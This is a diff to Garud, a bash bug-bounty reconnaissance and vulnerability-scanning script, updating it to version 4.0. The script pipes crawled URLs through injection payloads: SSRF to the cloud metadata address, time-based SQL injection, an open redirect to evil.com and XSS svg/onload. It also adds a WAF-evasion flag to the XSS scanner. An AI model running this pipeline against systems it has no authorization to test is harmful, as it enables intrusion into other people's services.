@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # coded by R0X4R
-# Garud - version 3.5
+# Garud - version 4.0
 # Contributers: KathanP19 (https://github.com/KathanP19), frost19k (https://github.com/frost19k), f8al (https://github.com/f8al), theamanrawat (https://github.com/theamanrawat), remonsec (https://github.com/remonsec), simrotion13 (https://github.com/simrotion13)
 
 #@> CHECK CONNECTION
@@ -16,7 +16,7 @@ EC=
 SL=False
 JO=False
 RO=False
-VR="Garud v3.5"
+VR="Garud v4.0"
 PR="21,22,80,81,280,300,443,583,591,593,832,981,1010,1099,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4444,4445,4567,4711,4712,4993,5000,5104,5108,5280,5281,5601,5800,6543,7000,7001,7002,7396,7474,8000,8001,8008,8009,8014,8042,8060,8069,8080,8081,8083,8088,8090,8091,8095,8118,8123,8172,8181,8222,8243,8280,8281,8333,8337,8443,8500,8530,8531,8834,8880,8887,8888,8983,9000,9001,9043,9060,9080,9090,9091,9092,9200,9443,9502,9800,9981,10000,10250,10443,11371,12043,12046,12443,15672,16080,17778,18091,18092,20720,28017,32000,55440,55672"
 
 #@> COLORS
@@ -162,9 +162,9 @@ SUBD_SCND(){
 SUBD_CHCK(){
     #@> FILTERING DOMAINS
     if [ -f "$EC" ]; then
-        cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
+        cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
     else
-        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
+        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
     fi
 
     #@> WEB PROBING AND SCREENSHOT
@@ -190,6 +190,7 @@ SUBD_SCAN(){
 #@> WEB CRAWLING AND FILTERING
 WEBC_RAWL(){
     echo -e "${BK}        ${RT}" | tr -d '\n' | pv -qL 6; echo -e " STARTING WEBCRAWLING ON ${BK}$DM${RT} (${YW}it may take time${RT})"
+    agnee -d $DM -q -o database/dorks.txt -p 4
     timeout 50m gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list
     xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list
     xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null
@@ -197,18 +198,13 @@ WEBC_RAWL(){
     [ "$JO" == "False" ] || cat database/urls.txt | python3 -c "import sys; import json; print (json.dumps({'endpoints':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/urls.json &> /dev/null
 
     #@> FILTERING ENDPOINTS USING PATTERNS
-    if [ -s "database/urls.txt" ]; then
-        gf xss database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/xss.list
-        gf lfi database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/lfi.list
-        gf rce database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/rce.list
-        gf ssrf database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q database/.gf/ssrf.list
-        gf ssti database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/ssti.list
-        gf sqli database/urls.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" 2> /dev/null | anew -q database/.gf/sqli.list
-        gf redirect database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" 2> /dev/null | anew -q database/.gf/redirect.list
-    else
-        echo -e "[!] - \"database/urls.txt\" file not found or doesn't contain anything"
-        exit 127
-    fi
+    gf xss database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/xss.list
+    gf lfi database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/lfi.list
+    gf rce database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/rce.list
+    gf ssrf database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q database/.gf/ssrf.list
+    gf ssti database/urls.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" 2> /dev/null | anew -q database/.gf/ssti.list
+    gf sqli database/urls.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" 2> /dev/null | anew -q database/.gf/sqli.list
+    gf redirect database/urls.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" 2> /dev/null | anew -q database/.gf/redirect.list
 
     xargs -a database/.gf/xss.list -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | awk '{print $2}' | anew -q .tmp/xssp.list
     cat .tmp/xssp.list 2> /dev/null | bhedak "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | anew -q .tmp/xss.txt
@@ -254,7 +250,7 @@ VULN_SCAN(){
     [ "$SL" == "False" ] && cat vulns/sqli.txt 2> /dev/null
     [ "$JO" == "False" ] || cat vulns/sqli.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'vuln_redirect':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/redirect.json &> /dev/null
 
-    dalfox file .tmp/xssp.list --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew vulns/dalfoxss.txt | notify -silent &> /dev/null
+    dalfox file .tmp/xssp.list --silence --no-color --waf-evasion --no-spinner --mass --mass-worker 100 --skip-bav -w 100 -H "X-Bugbounty: Testing" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" 2> /dev/null | anew vulns/dalfoxss.txt | notify -silent &> /dev/null
     [ "$SL" == "False" ] && cat vulns/dalfoxss.txt 2> /dev/null
     [ "$JO" == "False" ] || cat vulns/dalfoxss.txt 2> /dev/null | python3 -c "import sys; import json; print (json.dumps({'dalfox':list(sys.stdin)}))" | sed 's/\\n//g' | tee .json/dalfox.json &> /dev/null
 
@@ -293,5 +289,5 @@ do
     INFOM
     MAKDR
     VAULT
-    exit 0
+    exit
 done
